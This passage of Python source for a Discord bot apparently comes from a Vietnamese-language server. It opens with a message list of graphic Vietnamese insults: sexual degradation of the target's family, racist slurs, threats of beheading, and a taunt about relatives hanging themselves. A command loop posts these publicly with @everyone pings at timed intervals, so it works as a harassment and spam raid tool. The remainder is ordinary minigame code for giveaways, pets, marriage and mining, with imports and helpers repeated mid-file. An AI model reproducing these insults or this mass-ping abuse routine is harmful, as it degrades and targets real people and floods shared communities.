♡₊˚ 🦢・₊✧ ⋆˚🐾˖° 💢 🎀『 𝙃𝙤𝙩𝙩𝙧𝙚𝙤 𝙃𝙣𝙝𝙪𝙩 🪽 𝙖𝙣𝙝 𝙢𝙖̃𝙞 𝙩𝙧𝙪̛𝙤̛̀𝙣𝙜 𝙩𝙤̂̀𝙣 𝙩𝙝𝙚𝙤 𝙣𝙖̆𝙢 𝙩𝙝𝙖́𝙣𝙜 ℹ️ 𝙘𝙝𝙖 đ𝙚̉ 𝙘𝙪̉𝙖 𝙡𝙪̃ đ𝙪́ 𝙢𝙭𝙝 』🧸🌠⚡💫💤🍼
  ʕ•̫͡•ʕ•̫͡•ʔ•̫͡•ʔ•̫͡•ʕ•̫͡•ʔ•̫͡•  🇻🇳
----------------------------------------------
★　*　　　　　°　　　　🛰️　°·　　                            🪐

.　　　•　°★　•  ☄

▁▂▃▄▅▆▇▇▆▅▄▃▂▁ ꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꗝؖؖؖꕹؖؖؖꕥꕥؖؖؖꕹؖؖꕹꕥꕹꕹꗝꕥꕹꕹꗝꗝꕹꕥꕥ


𝗙𝗿𝗼𝗺 : 𝑯𝒏𝒉𝒖𝒕

♡₊˚ 🦢・₊✧ ⋆˚🐾˖° 💢 🎀『 𝙃𝙤𝙩𝙩𝙧𝙚𝙤 𝙃𝙣𝙝𝙪𝙩 🪽 𝙖𝙣𝙝 𝙢𝙖̃𝙞 𝙩𝙧𝙪̛𝙤̛̀𝙣𝙜 𝙩𝙤̂̀𝙣 𝙩𝙝𝙚𝙤 𝙣𝙖̆𝙢 𝙩𝙝𝙖́𝙣𝙜 ℹ️ 𝙘𝙝𝙖 đ𝙚̉ 𝙘𝙪̉𝙖 𝙡𝙪̃ đ𝙪́ 𝙢𝙭𝙝 』🧸🌠⚡💫💤🍼
  ʕ•̫͡•ʕ•̫͡•ʔ•̫͡•ʔ•̫͡•ʕ•̫͡•ʔ•̫͡•  🇻🇳
----------------------------------------------
★　*　　　　　°　　　　🛰️　°·　　                            🪐

.　　　•　°★　•  ☄

▁▂▃▄▅▆▇▇▆▅▄▃▂▁ ꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꗝؖؖؖꕹؖؖؖꕥꕥؖؖؖꕹؖؖꕹꕥꕹꕹꗝꕥꕹꕹꗝꗝꕹꕥꕥ


𝗙𝗿𝗼𝗺 : 𝑯𝒏𝒉𝒖𝒕

♡₊˚ 🦢・₊✧ ⋆˚🐾˖° 💢 🎀『 𝙃𝙤𝙩𝙩𝙧𝙚𝙤 𝙃𝙣𝙝𝙪𝙩 🪽 𝙖𝙣𝙝 𝙢𝙖̃𝙞 𝙩𝙧𝙪̛𝙤̛̀𝙣𝙜 𝙩𝙤̂̀𝙣 𝙩𝙝𝙚𝙤 𝙣𝙖̆𝙢 𝙩𝙝𝙖́𝙣𝙜 ℹ️ 𝙘𝙝𝙖 đ𝙚̉ 𝙘𝙪̉𝙖 𝙡𝙪̃ đ𝙪́ 𝙢𝙭𝙝 』🧸🌠⚡💫💤🍼
  ʕ•̫͡•ʕ•̫͡•ʔ•̫͡•ʔ•̫͡•ʕ•̫͡•ʔ•̫͡•  🇻🇳
----------------------------------------------
★　*　　　　　°　　　　🛰️　°·　　                            🪐

.　　　•　°★　•  ☄

▁▂▃▄▅▆▇▇▆▅▄▃▂▁ ꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꕥؖؖؖꕹؖؖؖꕹؖؖؖꗝꗝؖؖؖꕹؖؖؖꕥꕥؖؖؖꕹؖؖꕹꕥꕹꕹꗝꕥꕹꕹꗝꗝꕹꕥꕥ


𝗙𝗿𝗼𝗺 : 𝑯𝒏𝒉𝒖𝒕

   🔱Admin: https://www.facebook.com/nhoanqnhutdev
   https://cdn.discordapp.com/attachments/1324724935976812595/1508851174244356256/22ef482e0e8e915ca5ecd8a55c19ad2f_720_9.png?ex=6a17b369&is=6a1661e9&hm=42e408a5fbd80cc936e81bb8e7da183e87d404a0eff36fe896cefbcd7514fdf1&""",
            """# @everyone
# thằng cha làm ăn xin của m phải cất công tích lũy 10 năm mới mua được cái điện thoại ghẻ cho m lên đây xàm lồn với cha m dko =))
# con má mày tới tháng là lại phun nước máu lồn cho thk cha dượng mày uống
# Nghèo bần hèn bị cha mày đứng trên đạp đầu lũ đú chúng mày cha đi lên
# Cha mày hóa thân thành hắc bạch vô thường cha mày bắt hồn đĩ mẹ mày xuống chầu diêm vương
# Sống như 1 con chó ngu dốt như lũ phèn ói chợ búa cầm dao múa kiếm
# thằng ảo war bị tao chửi cố gắng phản kháng nhưng nút home k cho phép mày cay quá đập cmn máy 🤣👈
# ê cái con súc sinh chó đẻ này đang cố vùng vẫy trước khi anh hành quyết chém đầu con đĩ mẹ mày à mọi ngừi 😁👆
# thằng óc chó trăn chối điều cuối cùng gì trước khi anh cầm đao phủ anh rã vô não chó mày cho mày tử vong không á 😁🤟
# cái lồn mẹ mày tật nguyền đến mức đẻ ra sản phẩm lỗi của con người vậy cơ à 🗿🤟
# mẹ đẻ của mày giao phối với con chó ngao tây tạng nên mới đẻ được cái thứ súc vật như mày mà con chó điếm  🤣🤙
# cả gia đình m bị t sỉ vả cho đến mức thắt cổ tự tử mà =))=)
# cả họ nhà mày phải xếp hàng lần lượt bú dái t mà🤣🤣
# thằng đầu đinh ở nhà mái tôn lấy lá chuối đắp lồn mơ ước được ở nhà cao cửa rộng =))
# thằng này ăn và khen chubin anh singu khen ngon quá=))
# bố của mày là 1 con chó ngao tây tạng đó thằng óc chó 🫵😂
# anh đụ mẹ mày bằng bao cao su mà 🥺
# thằng óc cặc như mày làm gì đủ trình thừa kế ADN của bố đâu con 🤣
# nhào vô cắn nhau đi con cặc tật nguyền kia 🤣👎
# cái con óc chó ảo war bổ túc đúc súc vật như mày có trình ăn bố à con đĩ lồn tật 🥱
# anh dập nát 2 túi tinh trùng của mày như máy dập rõ mà 👌
# thk ngu bán dâm cho mấy con lồn già vú nhăn đi lấy tiền vô net chat với cha m hả=))
# cali ăn cứt cay cha m à=))
# thằng tộc châu phi bị đá nát sọ nằm bất động dưới bãi cứt =))
https://cdn.discordapp.com/attachments/1324724935976812595/1508851174244356256/22ef482e0e8e915ca5ecd8a55c19ad2f_720_9.png?ex=6a17b369&is=6a1661e9&hm=42e408a5fbd80cc936e81bb8e7da183e87d404a0eff36fe896cefbcd7514fdf1&"""]
        
        try:
            for i, msg in enumerate(messages, 1):
                await interaction.followup.send(
                    f"{msg}",allowed_mentions=discord.AllowedMentions(everyone=True),
                    ephemeral=False  
                )
                if i < len(messages):
                    await asyncio.sleep(self.interval)
            
        except Exception as e:
            await interaction.followup.send(
                f":x: 發送失敗：{str(e)}",
                ephemeral=True
            )

class GiveawayView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
        self.participants = set()
    @discord.ui.button(label="Join Giveaway", style=discord.ButtonStyle.success, emoji="🎉")
    async def join(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.participants.add(str(interaction.user.id))
        await interaction.response.send_message("✅ You joined the giveaway!", ephemeral=True)

@tree.command(name="giveaway", description="Host a giveaway for other players to join")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def giveaway(interaction: discord.Interaction, amount: int):
    uid = str(interaction.user.id)
    
    # 1. Deduct from host
    async with get_user_lock(uid):
        user = init_user(uid)
        if amount <= 0 or user["coins"] < amount:
            return await interaction.response.send_message("❌ Invalid amount or insufficient funds.", ephemeral=True)
        user["coins"] -= amount
        save_data()

    view = GiveawayView()
    embed = discord.Embed(title="🎉 GIVEAWAY!", description=f"Host: {interaction.user.mention}\nPrize: **{amount} 🪙**\nClick the button to join! Ends in 60 seconds.", color=discord.Color.gold())
    msg = await interaction.response.send_message(embed=embed, view=view)
    await asyncio.sleep(60)
    
    for child in view.children: child.disabled = True
    if not view.participants:
        # 2. Refund host if no joins
        async with get_user_lock(uid):
            user = init_user(uid)
            user["coins"] += amount
            save_data()
        return await interaction.edit_original_response(content="❌ Nobody joined. Coins refunded.", view=view, embed=None)

    # 3. Award winner
    winner = random.choice(list(view.participants))
    async with get_user_lock(winner):
        w_user = init_user(winner)
        w_user["coins"] += amount
        save_data()
    await interaction.edit_original_response(content=f"🎉 Giveaway ended! Winner: <@{winner}> won **{amount} 🪙**!", view=view, embed=None)

@tree.command(name="profile", description="View a beautiful profile card")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def profile(interaction: discord.Interaction, target: discord.User = None):
    target_user = target or interaction.user
    uid = str(target_user.id)
    user = init_user(uid)
    
    embed = discord.Embed(title=f"👤 {target_user.display_name}'s Profile", color=discord.Color.purple())
    embed.set_thumbnail(url=target_user.display_avatar.url)
    embed.add_field(name="💰 Wallet", value=f"**{user['coins']}** 🪙", inline=True)
    embed.add_field(name="🌐 Language", value=user["lang"].upper(), inline=True)
    embed.add_field(name="🏆 Total Won", value=f"**{user['stats']['money_won']}**", inline=True)
    embed.add_field(name="🎮 Games Played", value=str(user["stats"]["games_played"]), inline=True)
    
    if user.get("partner"):
        embed.add_field(name="💍 Married to", value=f"<@{user['partner']}>", inline=True)
    
    if user.get("pet"):
        embed.add_field(name="🐾 Pet", value=f"{user['pet']['type']} (Happy: {user['pet']['happiness']})", inline=True)
    
    inv = user.get("inventory", [])
    inv_str = ", ".join(inv) if inv else "Empty"
    embed.add_field(name="🎒 Inventory", value=inv_str, inline=False)
    
    await interaction.response.send_message(embed=embed)

@tree.command(name="marry", description="Propose to another user")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def marry(interaction: discord.Interaction, target: discord.User):
    uid = str(interaction.user.id)
    tid = str(target.id)
    
    if target.bot or uid == tid:
        return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)
        
    user = init_user(uid)
    if user.get("partner"):
        return await interaction.response.send_message("❌ You are already married!", ephemeral=True)
        
    class MarryView(discord.ui.View):
        def __init__(self): super().__init__(timeout=60)
        @discord.ui.button(label="Accept", style=discord.ButtonStyle.success)
        async def acc(self, i: discord.Interaction, b):
            if str(i.user.id) != tid: return await i.response.send_message("Not for you!", ephemeral=True)
            t_user = init_user(tid)
            if t_user.get("partner"): return await i.response.send_message("You are already married!", ephemeral=True)
            
            init_user(uid)["partner"] = tid
            t_user["partner"] = uid
            save_data()
            for c in self.children: c.disabled = True
            await i.response.edit_message(content=f"💍 **{target.mention} accepted the proposal!** You are now married!", view=self)
            self.stop()
            
    await interaction.response.send_message(f"💍 {target.mention}, {interaction.user.mention} is proposing to you! Do you accept?", view=MarryView())

class PetView(discord.ui.View):
    def __init__(self, uid):
        super().__init__(timeout=60)
        self.uid = uid
    @discord.ui.button(label="Feed", style=discord.ButtonStyle.success, emoji="🍖")
    async def feed(self, i: discord.Interaction, b):
        if str(i.user.id) != self.uid: return
        user = init_user(self.uid)
        user["pet"]["hunger"] = min(100, user["pet"]["hunger"] + 20)
        save_data()
        await i.response.edit_message(content=f"🍖 You fed your pet! Hunger: {user['pet']['hunger']}/100", view=self)
    @discord.ui.button(label="Play", style=discord.ButtonStyle.primary, emoji="🎾")
    async def play(self, i: discord.Interaction, b):
        if str(i.user.id) != self.uid: return
        user = init_user(self.uid)
        user["pet"]["happiness"] = min(100, user["pet"]["happiness"] + 20)
        save_data()
        await i.response.edit_message(content=f"🎾 You played with your pet! Happiness: {user['pet']['happiness']}/100", view=self)

@tree.command(name="pet", description="Adopt, feed, and play with a virtual pet")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.choices(action=[
    app_commands.Choice(name="Adopt a Dog", value="Dog"),
    app_commands.Choice(name="Adopt a Cat", value="Cat"),
    app_commands.Choice(name="Interact", value="Interact")
])
async def pet(interaction: discord.Interaction, action: app_commands.Choice[str]):
    uid = str(interaction.user.id)
    user = init_user(uid)
    
    if action.value in ["Dog", "Cat"]:
        if user.get("pet"): return await interaction.response.send_message("❌ You already have a pet!", ephemeral=True)
        user["pet"] = {"type": action.value, "hunger": 100, "happiness": 100}
        save_data()
        await interaction.response.send_message(f"🐾 You adopted a **{action.value}**!")
    else:
        if not user.get("pet"): return await interaction.response.send_message("❌ You don't have a pet to interact with! Adopt one first.", ephemeral=True)
        await interaction.response.send_message(f"🐾 **Your {user['pet']['type']}**\nHunger: {user['pet']['hunger']}/100\nHappiness: {user['pet']['happiness']}/100\n\nWhat do you want to do?", view=PetView(uid))

@tree.command(name="ship", description="Calculate the compatibility percentage between two users")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ship(interaction: discord.Interaction, user1: discord.User, user2: discord.User):
    # Isolated RNG for consistent pair results without global interference
    rng = random.Random(user1.id ^ user2.id)
    score = rng.randint(0, 100)
    bar = "█" * (score // 10) + "░" * (10 - (score // 10))
    embed = discord.Embed(title="❤️ Compatibility Test ❤️", description=f"{user1.mention} x {user2.mention}\nScore: **{score}%**\n`{bar}`", color=discord.Color.pink())
    await interaction.response.send_message(embed=embed)


# ==========================================
# SOLO MINIGAMES (Mine, Fish, Earn, Trivia, Scramble)
# ==========================================
import discord
from discord import app_commands
import random
import asyncio
import time

WORLD_LIMIT = 50000

def get_user_lock(uid):
    uid = str(uid)
    if uid not in user_locks:
        user_locks[uid] = asyncio.Lock()
    return user_locks[uid]

def init_user(uid):
    uid = str(uid)

    if uid not in user_data:
        user_data[uid] = {
            "coins": 1000,
            "xp": 0,
            "mine_px": 3,
            "mine_depth": 0,
            "sack": 0,
            "durability": 50,
            "repairing": False,
            "repair_end": 0,
            "inventory": ["Pickaxe Lvl 1"],
            "max_depth": 0,
            "level": 1
        }

    u = user_data[uid]

    u.setdefault("coins", 1000)
    u.setdefault("xp", 0)
    u.setdefault("mine_px", 3)
    u.setdefault("mine_depth", 0)
    u.setdefault("sack", 0)
    u.setdefault("durability", 50)
    u.setdefault("repairing", False)
    u.setdefault("repair_end", 0)
    u.setdefault("inventory", [])
    u.setdefault("max_depth", 0)
    u.setdefault("level", 1)

    # ✅ 防止舊玩家資料沒有鎬子，導致 tier = 0
    if not any(str(item).startswith("Pickaxe Lvl") for item in u["inventory"]):
        u["inventory"].append("Pickaxe Lvl 1")

    return u

def get_pickaxe_tier(u):
    inv = u.get("inventory", [])
    for i in range(5, 0, -1):
        if f"Pickaxe Lvl {i}" in inv:
            return i
    return 1

DURABILITY_TABLE = {
    1: 50,
    2: 200,
    3: 600,
    4: 1500,
    5: 8000
}

def get_max_durability(tier, level=1):
    base = DURABILITY_TABLE.get(tier, 50)
    return int(base * (1.015 ** level))

def power_of(tier):
    return {
        1: 1.0,
        2: 1.8,
        3: 3.0,
        4: 5.5,
        5: 12.0
    }.get(tier, 1.0)

def reward_mult(tier):
    return {
        1: 1.0,
        2: 1.2,
        3: 1.6,
        4: 2.2,
        5: 3.5
    }.get(tier, 1.0)

def xp_need(level):
    return int(80 * (level ** 1.15) * (1.05 ** level))

def repair_time(level):
    return max(30, int(600 / (1 + level * 0.12)))

def roll_cave_type():
    r = random.random()

    if r < 0.15:
        return "poor"
    elif r < 0.60:
        return "normal"
    elif r < 0.80:
        return "rich"
    elif r < 0.95:
        return "chaos"
    else:
        return "special"

def gen_block(x, y):
    rng = random.Random(f"{x}_{y}")
    roll = rng.random() * 100

    if y < 100:
        if roll < 5:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10}
        elif roll < 15:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1}
        elif roll < 15.1:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1, "Explosion": True}
        elif roll < 35.1:
            b = {"emoji": "🕳️", "hp": 1, "coins": 0, "xp": 0, "Cave": True}
        else:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1}

    elif y < 300:
        if roll < 10:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10}
        elif roll < 12:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25}
        elif roll < 47:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1}
        elif roll < 57:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1}
        elif roll < 57.1:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1, "Explosion": True}
        elif roll < 57.2:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Chest": True}
        elif roll < 57.3:
            b = {"emoji": "🟥", "hp": 200, "coins": 0, "xp": 1}
        elif roll < 57.4:
            b = {"emoji": "🟫", "hp": 100, "coins": 0, "xp": 1}
        elif roll < 57.5:
            b = {"emoji": "🪨", "hp": 500, "coins": 0, "xp": 1}
        elif roll < 57.51:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1, "Nodura": True}
        elif roll < 57.61:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10, "Lucky": True}
        elif roll < 57.71:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25, "Lucky": True}
        else:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1}

    elif y < 500:
        if roll < 0.5:
            b = {"emoji": "💎", "hp": 150, "coins": 800, "xp": 400}
        elif roll < 1.5:
            b = {"emoji": "🌟", "hp": 60, "coins": 250, "xp": 90}
        elif roll < 13.5:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10}
        elif roll < 17.5:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25}
        elif roll < 36:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1}
        elif roll < 55.95:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1}
        elif roll < 56.05:
            b = {"emoji": "🟫", "hp": 1, "coins": 0, "xp": 1, "Explosion": True}
        elif roll < 56.15:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Chest": True}
        elif roll < 56.2:
            b = {"emoji": "🟥", "hp": 400, "coins": 0, "xp": 1}
        elif roll < 56.25:
            b = {"emoji": "🟫", "hp": 200, "coins": 0, "xp": 1}
        elif roll < 56.3:
            b = {"emoji": "🪨", "hp": 1000, "coins": 0, "xp": 1}
        elif roll < 56.305:
            b = {"emoji": "🟥", "hp": 1, "coins": 0, "xp": 1, "Clear": True}
        elif roll < 56.325:
            b = {"emoji": "💎", "hp": 150, "coins": 800, "xp": 400, "Lucky": True}
        elif roll < 56.355:
            b = {"emoji": "🌟", "hp": 60, "coins": 250, "xp": 90, "Lucky": True}
        elif roll < 56.365:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Nodura": True}
        elif roll < 56.465:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10, "Lucky": True}
        elif roll < 56.565:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25, "Lucky": True}
        else:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1}

    elif y < 1000:
        if roll < 0.05:
            b = {"emoji": "💜", "hp": 900, "coins": 6000, "xp": 1500}
        elif roll < 0.15:
            b = {"emoji": "🔵", "hp": 600, "coins": 3000, "xp": 800}
        elif roll < 1.15:
            b = {"emoji": "💰", "hp": 1, "coins": random.randint(250, 500), "xp": 0}
        elif roll < 2.15:
            b = {"emoji": "💎", "hp": 150, "coins": 800, "xp": 400}
        elif roll < 4.15:
            b = {"emoji": "🌟", "hp": 60, "coins": 250, "xp": 90}
        elif roll < 14.15:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25}
        elif roll < 29.15:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10}
        elif roll < 59.15:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1}
        elif roll < 59.25:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Explosion": True}
        elif roll < 59.35:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Chest": True}
        elif roll < 59.4:
            b = {"emoji": "🟥", "hp": 800, "coins": 0, "xp": 1}
        elif roll < 59.45:
            b = {"emoji": "🪨", "hp": 1600, "coins": 0, "xp": 1}
        elif roll < 59.455:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Clear": True}
        elif roll < 59.485:
            b = {"emoji": "💎", "hp": 150, "coins": 800, "xp": 400, "Lucky": True}
        elif roll < 59.505:
            b = {"emoji": "🌟", "hp": 60, "coins": 250, "xp": 90, "Lucky": True}
        elif roll < 59.506:
            b = {"emoji": "💜", "hp": 900, "coins": 6000, "xp": 1500, "Lucky": True}
        elif roll < 59.508:
            b = {"emoji": "🔵", "hp": 600, "coins": 3000, "xp": 800, "Lucky": True}
        elif roll < 59.518:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1, "Nodura": True}
        elif roll < 59.618:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10, "Lucky": True}
        elif roll < 59.718:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25, "Lucky": True}
        else:
            b = {"emoji": "🟥", "hp": 2, "coins": 0, "xp": 1}

    elif y < 2000:
        if roll < 0.00005:
            b = {"emoji": "💠", "hp": 8000, "coins": 0, "xp": 0, "Special": True}
        elif roll < 0.01:
            b = {"emoji": "🏺", "hp": 2400, "coins": 15000, "xp": 5000}
        elif roll < 0.03:
            b = {"emoji": "🌀", "hp": 1500, "coins": 8000, "xp": 2250}
        elif roll < 0.08:
            b = {"emoji": "💜", "hp": 900, "coins": 6000, "xp": 1500}
        elif roll < 0.18:
            b = {"emoji": "🔵", "hp": 600, "coins": 3000, "xp": 800}
        elif roll < 1.18:
            b = {"emoji": "💰", "hp": 1, "coins": random.randint(250, 500), "xp": 0}
        elif roll < 2.18:
            b = {"emoji": "💎", "hp": 150, "coins": 800, "xp": 400}
        elif roll < 4.18:
            b = {"emoji": "🌟", "hp": 60, "coins": 250, "xp": 90}
        elif roll < 14.18:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25}
        elif roll < 39.18:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10}
        elif roll < 39.28:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1, "Explosion": True}
        elif roll < 39.33:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1, "Chest": True}
        elif roll < 39.38:
            b = {"emoji": "🪨", "hp": 3200, "coins": 0, "xp": 1}
        elif roll < 39.385:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1, "Clear": True}
        elif roll < 39.405:
            b = {"emoji": "💎", "hp": 150, "coins": 800, "xp": 400, "Lucky": True}
        elif roll < 39.435:
            b = {"emoji": "🌟", "hp": 60, "coins": 250, "xp": 90, "Lucky": True}
        elif roll < 39.4352:
            b = {"emoji": "🏺", "hp": 2400, "coins": 15000, "xp": 5000, "Lucky": True}
        elif roll < 39.4356:
            b = {"emoji": "🌀", "hp": 1500, "coins": 8000, "xp": 2250, "Lucky": True}
        elif roll < 39.4366:
            b = {"emoji": "💜", "hp": 900, "coins": 6000, "xp": 1500, "Lucky": True}
        elif roll < 39.4386:
            b = {"emoji": "🔵", "hp": 600, "coins": 3000, "xp": 800, "Lucky": True}
        elif roll < 39.4486:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1, "Nodura": True}
        elif roll < 39.5486:
            b = {"emoji": "◼️", "hp": 8, "coins": 25, "xp": 10, "Lucky": True}
        elif roll < 39.6486:
            b = {"emoji": "🔘", "hp": 15, "coins": 50, "xp": 25, "Lucky": True}
        elif roll < 39.6496:
            b = {"emoji": "🕳️", "hp": 1, "coins": 0, "xp": 0, "Cave": True}
        else:
            b = {"emoji": "🪨", "hp": 5, "coins": 0, "xp": 1}

    else:
        if roll < 0.00005:
            b = {"emoji": "💠", "hp": 16000, "coins": 0, "xp": 0, "Special": True}
        elif roll < 0.01:
            b = {"emoji": "🏺", "hp": 4800, "coins": 15000, "xp": 5000}
        elif roll < 0.03:
            b = {"emoji": "🌀", "hp": 3000, "coins": 8000, "xp": 2250}
        elif roll < 0.08:
            b = {"emoji": "💜", "hp": 1800, "coins": 6000, "xp": 1500}
        elif roll < 0.18:
            b = {"emoji": "🔵", "hp": 1200, "coins": 3000, "xp": 800}
        elif roll < 1.18:
            b = {"emoji": "💰", "hp": 1, "coins": random.randint(250, 500), "xp": 0}
        elif roll < 2.18:
            b = {"emoji": "💎", "hp": 300, "coins": 800, "xp": 400}
        elif roll < 4.18:
            b = {"emoji": "🌟", "hp": 120, "coins": 250, "xp": 90}
        elif roll < 14.18:
            b = {"emoji": "🔘", "hp": 30, "coins": 50, "xp": 25}
        elif roll < 39.18:
            b = {"emoji": "◼️", "hp": 16, "coins": 25, "xp": 10}
        elif roll < 39.28:
            b = {"emoji": "🪨", "hp": 10, "coins": 0, "xp": 1, "Explosion": True}
        elif roll < 39.33:
            b = {"emoji": "🪨", "hp": 10, "coins": 0, "xp": 1, "Chest": True}
        elif roll < 39.38:
            b = {"emoji": "🪨", "hp": 6400, "coins": 0, "xp": 1}
        elif roll < 39.385:
            b = {"emoji": "🪨", "hp": 10, "coins": 0, "xp": 1, "Clear": True}
        elif roll < 39.405:
            b = {"emoji": "💎", "hp": 300, "coins": 800, "xp": 400, "Lucky": True}
        elif roll < 39.435:
            b = {"emoji": "🌟", "hp": 120, "coins": 250, "xp": 90, "Lucky": True}
        elif roll < 39.4352:
            b = {"emoji": "🏺", "hp": 4800, "coins": 15000, "xp": 5000, "Lucky": True}
        elif roll < 39.4356:
            b = {"emoji": "🌀", "hp": 3000, "coins": 8000, "xp": 2250, "Lucky": True}
        elif roll < 39.4366:
            b = {"emoji": "💜", "hp": 1800, "coins": 6000, "xp": 1500, "Lucky": True}
        elif roll < 39.4386:
            b = {"emoji": "🔵", "hp": 1200, "coins": 3000, "xp": 800, "Lucky": True}
        elif roll < 39.4486:
            b = {"emoji": "🪨", "hp": 10, "coins": 0, "xp": 1, "Nodura": True}
        elif roll < 39.5486:
            b = {"emoji": "◼️", "hp": 16, "coins": 25, "xp": 10, "Lucky": True}
        elif roll < 39.6486:
            b = {"emoji": "🔘", "hp": 30, "coins": 50, "xp": 25, "Lucky": True}
        elif roll < 39.6496:
            b = {"emoji": "🕳️", "hp": 1, "coins": 0, "xp": 0, "Cave": True}
        else:
            b = {"emoji": "🪨", "hp": 10, "coins": 0, "xp": 1}

    if y <= 5000:
        hp_mult = 1
    else:
        step = (y - 5000) // 1000 + 1
        hp_mult = 1.08 ** step

    b["hp"] = int(b["hp"] * hp_mult)
    b["max_hp"] = int(b["hp"])
    b["curr_hp"] = int(b["hp"])
    return b

def get_block(x, y):
    key = f"{x},{y}"
    block = world.get(key)

    if block is None:
        if len(world) > WORLD_LIMIT:
            world.clear()

        block = gen_block(x, y)
        world[key] = block

    return block

class MineView(discord.ui.View):
    def __init__(self, uid):
        super().__init__(timeout=None)
        self.uid = str(uid)
        self.u = user_data[self.uid]
        self.target = None
        self.locked = False
        self.log = "⛏️ Choose a direction to start mining."

    def cam(self):
        return max(0, self.u.get("max_depth", 0) - 8)
        
    def check_level_up(self):
        while True:
            lvl = self.u.get("level", 1)
            need = xp_need(lvl)

            if self.u["xp"] >= need:
                self.u["xp"] -= need
                self.u["level"] = lvl + 1
            else:
                break

    def handle_cave_block(self, block, bx=None, by=None):
    
        if block.get("claimed"):
            return 0, "⚠️ Already claimed."
    
        block["claimed"] = True
    
        earn = block.get("coins", 0)
        xp = block.get("xp", 0)
        effect = block.get("effect", "normal")
    
        self.u["xp"] += xp
    
        log = f"✅ Broke 🟫! +{earn} coins / +{xp} XP"
    
        if effect == "small":
            r = random.random() * 100
    
            if r < 20:
                self.u["durability"] = min(50, self.u["durability"] + 5)
                log += " | 🔋 +5 durability"
    
            elif r < 35:
                self.u["durability"] = max(0, self.u["durability"] - 5)
                log += " | 🪫 -5 durability"
    
            elif r < 50:
                bonus = int(self.u.get("cave_earn", 0) * 0.2)
                self.u["cave_earn"] += bonus
                log += f" | 📈 +20% reward (+{bonus})"
    
            elif r < 60:
                loss = int(self.u.get("cave_earn", 0) * 0.2)
                self.u["cave_earn"] = max(0, self.u.get("cave_earn", 0) - loss)
                log += f" | 📉 -20% reward (-{loss})"
    
            elif r < 70:
                need = xp_need(self.u.get("level", 1))
                bonus_xp = need // 10
                self.u["xp"] += bonus_xp
                log += f" | ⭐ Experience bonus (+{bonus_xp} XP)"
    
            elif r < 95:
                lucky = round(random.uniform(1.0, 5.0), 1)
                extra = int(earn * (lucky - 1))
                earn = int(earn * lucky)
                log += f" | 🍀 Lucky x{lucky} (+{extra})"
    
            else:
                log += " | 💥 Explosion!"
                center_x = bx if bx is not None else self.u["cave_px"]
                center_y = by if by is not None else self.u["cave_py"]
                for ex in [-1, 0, 1]:
                    for ey in [-1, 0, 1]:
                
                        nx = center_x + ex
                        ny = center_y + ey
                
                        if nx < 0 or nx > 5 or ny < 0 or ny > 9:
                            continue
                
                        target = self.u["cave_grid"][ny][nx]
                
                        if not isinstance(target, dict):
                            continue
                
                        if target.get("type") == "empty":
                            continue
                
                        if target.get("claimed"):
                            continue
                
                        target["claimed"] = True
                
                        gain_c = target.get("coins", 0)
                        gain_x = target.get("xp", 0)
                
                        earn += gain_c
                        self.u["xp"] += gain_x
                
                        self.u["cave_grid"][ny][nx] = {
                            "type": "empty"
                        }
                    
        return earn, log

    def gen_cave(self):
    
        grid = []
    
        cave_type = self.u.get("cave_type", "normal")
    
        mult = {
            "poor": 0.75,
            "normal": 1.0,
            "rich": 1.25,
            "chaos": 1.0,
            "special": 1.5
        }.get(cave_type, 1.0)
    
        for y in range(10):
            row = []
